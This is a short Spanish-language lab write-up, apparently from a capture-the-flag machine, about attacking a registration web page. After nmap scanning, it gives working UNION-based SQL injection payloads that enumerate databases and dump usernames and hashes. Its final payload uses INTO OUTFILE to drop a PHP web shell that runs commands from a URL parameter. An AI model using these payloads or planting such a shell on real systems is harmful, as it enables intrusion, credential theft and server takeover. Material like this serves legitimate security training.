## Reconocimiento

`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.116 -oG allPorts`

`nmap -p 22,80,4566,8080 -sCV -vvv 10.10.11.116 -oN targeted`

```
22/ssh
80/http
4566/http
8080/http
```

Navegamos al puerto 80.
Probando a introducir valores vemos que es vulnerable a HTMLinjection, También a Inyecciones XSS

Interceptamos la petición con Burpsuite, y vemos que en el campo de selección de países se puede inyectar código SQL y se ven reflejados en la web

`' union select database()-- -` Enumerar base de datos acctual `registration`

`' union select schema_name from information_schema.schemata-- -` Enumerar todas las bases de datos

`' union select table_name from information_schema.tables where table_schema="registration"-- -` Enumerar las tables de la base de datos registration.

`union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -` Enumerar las columnas

`' union select group_concat(username,0x3a,userhash) from registration-- -` Obtener los valores de las columnas

BBDD:
`registration`
Tables:
`registration`
Columns:
`username` `userhash` `country` `regtime`
Valores:
Se nos muestran los valores de prueba que hemos generado nosotros anteriormente, y esos no nos valen

Validaremos si somos capacidades de depositar contenido en una ruta
`' union select "probando" into outfile "/var/www/html/prueba.txt"-- -` somos capaces de poder depositar contenido en diversas rutas

Como interpreta PHP la idea es inyectara un archivo de este tipo
`' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -`

Esto nos permite desde la URL acceder a `prueba.php` y con el parámetro `cmd` ejecutar comandos en el sistema